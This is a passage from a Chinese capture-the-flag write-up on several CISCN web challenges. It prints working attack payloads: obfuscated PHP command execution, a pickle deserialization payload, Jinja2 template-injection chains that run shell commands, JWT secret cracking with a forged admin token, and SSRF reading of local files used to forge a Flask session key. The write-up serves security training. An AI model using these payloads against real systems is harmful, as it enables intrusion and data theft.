//<span class="hljs-built_in">system</span>(<span class="hljs-built_in">getallheaders</span>()[<span class="hljs-number">1</span>])  实际上就是找到键值为<span class="hljs-number">1</span>对应的value</code></pre>
<h2 id="方法三">方法三：</h2>
<p>exec：</p>
<pre><code class="hljs scss"><span class="hljs-built_in">hexdec</span>(bin2hex('cat f*'));        <span class="hljs-comment">//得到109270211257898</span>
<span class="hljs-built_in">base_convert</span>('exec',<span class="hljs-number">36</span>,<span class="hljs-number">10</span>);        <span class="hljs-comment">//得到696468</span></code></pre>
<p>payload：</p>
<pre><code class="hljs scss">?c=($pi=base_convert)(<span class="hljs-number">696468</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)($pi(<span class="hljs-number">76478043844</span>,<span class="hljs-number">9</span>,<span class="hljs-number">34</span>)(dechex(<span class="hljs-number">109270211257898</span>)))
 
<span class="hljs-comment">//exec('hex2bin(dechex(109270211257898))') =&gt; exec('cat f*')</span></code></pre>
<p>这里发现一个问题，这个payload超过了80的长度限制，所以只能换进制，最终如下（但测试之后不成功？？）</p>
<pre><code class="hljs scss">/index<span class="hljs-selector-class">.php</span>?c=($pi=base_convert)(<span class="hljs-number">22950</span>,<span class="hljs-number">23</span>,<span class="hljs-number">34</span>)($pi(<span class="hljs-number">76478043844</span>,<span class="hljs-number">9</span>,<span class="hljs-number">34</span>)(dechex(<span class="hljs-number">109270211257898</span>)))
<span class="hljs-comment">//分析：exec('hex2bin(dechex(109270211257898))') =&gt; exec('cat f*')</span>

/index<span class="hljs-selector-class">.php</span>?c=<span class="hljs-built_in">base_convert</span>(<span class="hljs-number">1751504350</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(base_convert(<span class="hljs-number">15941</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>).(dechex(<span class="hljs-number">16</span>)^asinh^pi))
<span class="hljs-comment">//分析：system('cat'.dechex(16)^asinh^pi) =&gt; system('cat *')</span></code></pre>
<h2 id="方法四">方法四：</h2>
<p>前面都是利用白名单的数学函数将数字转成字符串，其实也可以异或构造这是fuzz脚本</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$payload</span>=[<span class="hljs-string">'abs'</span>, <span class="hljs-string">'acos'</span>, <span class="hljs-string">'acosh'</span>, <span class="hljs-string">'asin'</span>, <span class="hljs-string">'asinh'</span>, <span class="hljs-string">'atan2'</span>, <span class="hljs-string">'atan'</span>, <span class="hljs-string">'atanh'</span>,  <span class="hljs-string">'bindec'</span>, <span class="hljs-string">'ceil'</span>, <span class="hljs-string">'cos'</span>, <span class="hljs-string">'cosh'</span>, <span class="hljs-string">'decbin'</span>, <span class="hljs-string">'decoct'</span>, <span class="hljs-string">'deg2rad'</span>, <span class="hljs-string">'exp'</span>, <span class="hljs-string">'expm1'</span>, <span class="hljs-string">'floor'</span>, <span class="hljs-string">'fmod'</span>, <span class="hljs-string">'getrandmax'</span>, <span class="hljs-string">'hexdec'</span>, <span class="hljs-string">'hypot'</span>, <span class="hljs-string">'is_finite'</span>, <span class="hljs-string">'is_infinite'</span>, <span class="hljs-string">'is_nan'</span>, <span class="hljs-string">'lcg_value'</span>, <span class="hljs-string">'log10'</span>, <span class="hljs-string">'log1p'</span>, <span class="hljs-string">'log'</span>, <span class="hljs-string">'max'</span>, <span class="hljs-string">'min'</span>, <span class="hljs-string">'mt_getrandmax'</span>, <span class="hljs-string">'mt_rand'</span>, <span class="hljs-string">'mt_srand'</span>, <span class="hljs-string">'octdec'</span>, <span class="hljs-string">'pi'</span>, <span class="hljs-string">'pow'</span>, <span class="hljs-string">'rad2deg'</span>, <span class="hljs-string">'rand'</span>, <span class="hljs-string">'round'</span>, <span class="hljs-string">'sin'</span>, <span class="hljs-string">'sinh'</span>, <span class="hljs-string">'sqrt'</span>, <span class="hljs-string">'srand'</span>, <span class="hljs-string">'tan'</span>, <span class="hljs-string">'tanh'</span>];
<span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$k</span>&lt;=<span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$k</span>++){
    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">9</span>; <span class="hljs-variable">$i</span>++){
        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$j</span>&lt;=<span class="hljs-number">9</span>;<span class="hljs-variable">$j</span>++){
            <span class="hljs-variable">$exp</span>=<span class="hljs-variable">$payload</span>[<span class="hljs-variable">$k</span>] ^<span class="hljs-variable">$i</span>.<span class="hljs-variable">$j</span>;
            <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$payload</span>[<span class="hljs-variable">$k</span>].<span class="hljs-string">"^<span class="hljs-subst">$i</span><span class="hljs-subst">$j</span>"</span>.<span class="hljs-string">"==&gt;<span class="hljs-subst">$exp</span>"</span>);
            <span class="hljs-keyword">echo</span><span class="hljs-string">"&lt;br /&gt;"</span>;
        }
    }
}</code></pre>
<p>得到<code>is_nan^64==&gt;_G</code>和<code>tan^15==&gt;ET</code></p>
<p>payload:</p>
<pre><code class="hljs scss">?c=<span class="hljs-variable">$pi</span>=(is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>));<span class="hljs-variable">$pi</span>=$<span class="hljs-variable">$pi</span>;<span class="hljs-variable">$pi</span>{<span class="hljs-number">0</span>}($pi{<span class="hljs-number">1</span>})&amp;<span class="hljs-number">0</span>=system&amp;<span class="hljs-number">1</span>=cat flag<span class="hljs-selector-class">.php</span>
 
<span class="hljs-comment">//$pi=_GET;$pi=$_GET;$_GET[0]($_GET[1])&amp;0=system&amp;1=cat flag.php     ==&gt; system(cat flag.php)</span></code></pre>
<h1 id="ciscn-2019华北day1web2">[CISCN 2019华北Day1]Web2</h1>
<p>首先是一个脚本爆破</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231117205221800.png" alt="image-20231117205221800"></p>
<p>首页告诉我们要卖到lv6，那我们首先得找到它，由于页面很多，手动不现实，故此需要脚本找</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">2000</span>):
    time.sleep(<span class="hljs-number">0.5</span>)
    url = <span class="hljs-string">'http://dfb21cdf-d431-4926-b0fa-b5d1905ac641.node4.buuoj.cn:81/shop?page={}'</span>.<span class="hljs-built_in">format</span>(i)
    res = requests.get(url)
    <span class="hljs-keyword">if</span> <span class="hljs-string">'lv6.png'</span> <span class="hljs-keyword">in</span> res.text:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"找到lv6----{}"</span>.<span class="hljs-built_in">format</span>(i))</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231117205950545.png" alt="image-20231117205950545"></p>
<p>如上图在181页，我们访问看看，我们在结算的时候抓包看看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231117205832323.png" alt="image-20231117205832323"></p>
<p>如上图我们修改折扣进行购买，随后看到右侧有个重定向，我们访问看看b1g_m4mber</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231117205907430.png" alt="image-20231117205907430"></p>
<p>看到这里只允许admin访问，又看到其中有jwt，那毫无疑问就是伪造jtw了，那首先我们先要拿到secret，这里也是看wp发现是通过爆破找到secret的，直接上工具：</p>
<p>github链接<code>https://github.com/brendan-rius/c-jwt-cracker</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231117222052443.png" alt="image-20231117222052443"></p>
<p>用法这里就不赘述了，如上图可以看到secret是1Kun</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231117222213855.png" alt="image-20231117222213855"></p>
<p>如上图进行伪造之后发送到bp：</p>
<pre><code class="hljs plaintext">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.sxEqhTA_xPDDL_4t8tiMNUIALRjMHxFOsKkzUOc1MPA</code></pre>
<p>发送之后是如下页面：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231118092031351.png" alt="image-20231118092031351"></p>
<p>成功以admin身份登录，接下来看一下源代码发现存在www.zip我们下载看看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231118092024158.png" alt="image-20231118092024158"></p>
<p>如果我们上述成功的话，就会得到源码，我们找到Admin.py看到如下代码</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> tornado.web
<span class="hljs-keyword">from</span> sshop.base <span class="hljs-keyword">import</span> BaseHandler
<span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> urllib
 
 
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminHandler</span>(<span class="hljs-title class_ inherited__">BaseHandler</span>):
<span class="hljs-meta">    @tornado.web.authenticated</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self, *args, **kwargs</span>):
        <span class="hljs-keyword">if</span> self.current_user == <span class="hljs-string">"admin"</span>:
            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=<span class="hljs-string">'This is Black Technology!'</span>, member=<span class="hljs-number">0</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'no_ass.html'</span>)
 
<span class="hljs-meta">    @tornado.web.authenticated</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">self, *args, **kwargs</span>):
        <span class="hljs-keyword">try</span>:
            become = self.get_argument(<span class="hljs-string">'become'</span>)
            p = pickle.loads(urllib.unquote(become))
            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=p, member=<span class="hljs-number">1</span>)
        <span class="hljs-keyword">except</span>:
            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=<span class="hljs-string">'This is Black Technology!'</span>, member=<span class="hljs-number">0</span>)</code></pre>
<p>分析可以知道，只有我们用户为admin，随后向become进行传参，内容为序列化内容之后由于render的存在，我们可以执行恶意代码，payload如下</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> urllib

<span class="hljs-keyword">class</span> <span class="hljs-title class_">pop</span>(<span class="hljs-title class_ inherited__">object</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span>(<span class="hljs-built_in">eval</span>, (<span class="hljs-string">"open('/flag.txt', 'r').read()"</span>, ))

poc = pop()
s = pickle.dumps(poc)
<span class="hljs-built_in">print</span>(urllib.qoute(s))<span class="hljs-comment">#注意上述题目中的p参数是经过urllib.unquote函数处理的</span></code></pre>
<p>之后在python2环境下运行，向become传参即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231118094613051.png" alt="image-20231118094613051"></p>
<p>这里点击页面的一键成为大会员之后抓包，修改become参数，拿到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20231118094606060.png" alt="image-20231118094606060"></p>
<h1 id="ciscn-2019华东南web4">[CISCN 2019华东南]Web4</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214153537023.png" alt="image-20240214153537023"></p>
<p>首页发现存在ssrf，尝试几次发现file被ban，看了wp知道还有local_file可以用，直接读取源代码/app/app.py</p>
<pre><code class="hljs py"><span class="hljs-comment"># encoding:utf-8</span>
<span class="hljs-keyword">import</span> re, random, uuid, urllib
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request

app = Flask(__name__)
random.seed(uuid.getnode())
app.config[<span class="hljs-string">'SECRET_KEY'</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)
app.debug = <span class="hljs-literal">True</span>

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
    session[<span class="hljs-string">'username'</span>] = <span class="hljs-string">'www-data'</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">'Hello World! &lt;a href="/read?url=https://baidu.com"&gt;Read somethings&lt;/a&gt;'</span>

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/read'</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():
    <span class="hljs-keyword">try</span>:
        url = request.args.get(<span class="hljs-string">'url'</span>)
        m = re.findall(<span class="hljs-string">'^file.*'</span>, url, re.IGNORECASE)
        n = re.findall(<span class="hljs-string">'flag'</span>, url, re.IGNORECASE)
        <span class="hljs-keyword">if</span> m <span class="hljs-keyword">or</span> n:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'No Hack'</span>
        res = urllib.urlopen(url)
        <span class="hljs-keyword">return</span> res.read()
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:
        <span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>(ex)
    <span class="hljs-keyword">return</span> <span class="hljs-string">'no response'</span>

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/flag'</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():
    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">and</span> session[<span class="hljs-string">'username'</span>] == <span class="hljs-string">'fuck'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'/flag.txt'</span>).read()
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">'Access denied'</span>

<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">'__main__'</span>:
    app.run(
        debug=<span class="hljs-literal">True</span>,
        host=<span class="hljs-string">"0.0.0.0"</span>
    )</code></pre>
<p>看代码知道将file、flag给ban了，但如果我们访问flag路由的时候，存在session且其中的username的键值为fuck，即可成功读取flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214153957044.png" alt="image-20240214153957044"></p>
<p>同时页面抓包发现这是python2，这时候只需要重点看一下session-key是如何生成的：</p>
<pre><code class="hljs py">random.seed(uuid.getnode())
app.config[<span class="hljs-string">'SECRET_KEY'</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214154629894.png" alt="image-20240214154629894"></p>
<p>查询一番发现这里的uuid函数是用来获取Mac地址的，并将其当做随机数种子来生成key，那我们先读取一下Mac地址是什么</p>
<pre><code class="hljs scss">local_file:///sys/class/net/eth0/address</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214155059319.png" alt="image-20240214155059319"></p>
<p>得到之后带入上述生成的key，并用py2运行，拿到key</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214162053535.png" alt="image-20240214162053535"></p>
<p>接着使用脚本解密session即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214162106093.png" alt="image-20240214162106093"></p>
<p>最后将加密后的结果修改进cookie即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214162139797.png" alt="image-20240214162139797"></p>
<h1 id="ciscn-2019华东南double-secret">[CISCN 2019华东南]Double Secret</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214164725083.png" alt="image-20240214164725083"></p>
<p>扫出三个目录，一个个试了，就如下页面有点用，发现有报错，但这里不知道为何我不能看报错代码。。。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214164719459.png" alt="image-20240214164719459"></p>
<p>直接借用wp的了</p>
<pre><code class="hljs scss"><span class="hljs-built_in">if</span>(secret==None):
    return <span class="hljs-string">'Tell me your secret.I will encrypt it so others can\'t see'</span>
rc=rc4_Modified.<span class="hljs-built_in">RC4</span>(<span class="hljs-string">"HereIsTreasure"</span>)   #解密
deS=rc.<span class="hljs-built_in">do_crypt</span>(secret)
 
a=<span class="hljs-built_in">render_template_string</span>(<span class="hljs-built_in">safe</span>(deS))
 
if <span class="hljs-string">'ciscn'</span> in a.<span class="hljs-built_in">lower</span>():
    return <span class="hljs-string">'flag detected!'</span>
return a</code></pre>
<p>这里对secret内容进行rc4解密，随后对deS进行模板渲染，其中还有一个safe似乎是过滤函数，放一个rc4加密脚本</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
<span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_main</span>(<span class="hljs-params">key = <span class="hljs-string">"init_key"</span>, message = <span class="hljs-string">"init_message"</span></span>):
    <span class="hljs-comment"># print("RC4加密主函数")</span>
    s_box = rc4_init_sbox(key)
    crypt = <span class="hljs-built_in">str</span>(rc4_excrypt(message, s_box))
    <span class="hljs-keyword">return</span>  crypt
<span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init_sbox</span>(<span class="hljs-params">key</span>):
    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))  <span class="hljs-comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span>
    <span class="hljs-comment"># print("原来的 s 盒：%s" % s_box)</span>
    j = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
        j = (j + s_box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span>
        s_box[i], s_box[j] = s_box[j], s_box[i]
    <span class="hljs-comment"># print("混乱后的 s 盒：%s"% s_box)</span>
    <span class="hljs-keyword">return</span> s_box
<span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_excrypt</span>(<span class="hljs-params">plain, box</span>):
    <span class="hljs-comment"># print("调用加密程序成功。")</span>
    res = []
    i = j = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:
        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>
        j = (j + box[i]) % <span class="hljs-number">256</span>
        box[i], box[j] = box[j], box[i]
        t = (box[i] + box[j]) % <span class="hljs-number">256</span>
        k = box[t]
        res.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s) ^ k))
    <span class="hljs-comment"># print("res用于加密字符串，加密后是：%res" %res)</span>
    cipher = <span class="hljs-string">""</span>.join(res)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"加密后的字符串是：%s"</span> %quote(cipher))
    <span class="hljs-comment">#print("加密后的输出(经过编码):")</span>
    <span class="hljs-comment">#print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))</span>
    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>(base64.b64encode(cipher.encode(<span class="hljs-string">'utf-8'</span>)), <span class="hljs-string">'utf-8'</span>))
<span class="hljs-comment">#需要加密的字符串在这里修改</span>
rc4_main(<span class="hljs-string">"HereIsTreasure"</span>,<span class="hljs-string">"{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}"</span>)</code></pre>
<p>这里有佬说明：这里是后端对secret传入的值进行了RC4加密，RC4加密方式为，明文加密一次得到密文，密文在加密一次得到明文。所以要使用RC4脚本对我们传入的恶意字符串进行一次加密，这样传给系统，既绕过检测，同时还得到了明文得以执行</p>
<p>不过这道题似乎直接用上述的ssti直接读取flag即可</p>
<pre><code class="hljs scss"><span class="hljs-built_in">rc4_main</span>("HereIsTreasure","{{''.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()}}")</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214165107909.png" alt="image-20240214165107909"></p>
<p>下标为59的是<code>warnings.catch_warnings</code>，直接利用即可：</p>
<pre><code class="hljs scss"><span class="hljs-built_in">rc4_main</span>("HereIsTreasure","{{''.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-class">.__builtins__</span><span class="hljs-selector-class">.__import__</span>('os')<span class="hljs-selector-class">.popen</span>('cat /flag.txt')<span class="hljs-selector-class">.read</span>()}}")</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214165207754.png" alt="image-20240214165207754"></p>
<p>看了wp发现，可以通过执行py代码直接一步到位：</p>
<pre><code class="hljs py">{% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %}{% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">'catch_warnings'</span> %}{{ c.__init__.__globals__[<span class="hljs-string">'__builtins__'</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">"__import__('os').popen('ls /').read()"</span>)}}{% endif %}{% endfor %}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240214165349178.png" alt="image-20240214165349178"></p>
<p>找到了flag位置，随后读取：</p>
<pre><code class="hljs py">{% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %}{% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">'catch_warnings'</span> %}{{ c.__init__.__globals__[<span class="hljs-string">'__builtins__'</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">"__import__('os').popen('cat /flag.txt').read()"</span>)}}{% endif %}{% endfor %}</code></pre>
<h1 id="ciscn-2022-初赛ezpop">[CISCN 2022 初赛]ezpop</h1>
<p>这道题先是一个源码泄露，www.zip接着我们打开之后，看到如下路由：<code>app/controller/index.php</code></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">controller</span>;

<span class="hljs-keyword">use</span> <span class="hljs-title">app</span>\<span class="hljs-title">BaseController</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseController</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">'&lt;style type="text/css"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V'</span> . \think\facade<span class="hljs-title class_">\App</span>::<span class="hljs-title function_ invoke__">version</span>() . <span class="hljs-string">'&lt;br/&gt;&lt;span style="font-size:30px;"&gt;14载初心不改 - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;span style="font-size:25px;"&gt;[ V6.0 版本由 &lt;a href="https://www.yisu.com/" target="yisu"&gt;亿速云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;think id="ee9b1aa918103c4fc"&gt;&lt;/think&gt;'</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">'ThinkPHP6'</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">'hello,'</span> . <span class="hljs-variable">$name</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
   	<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'a'</span>]);
    }
    
}</code></pre>
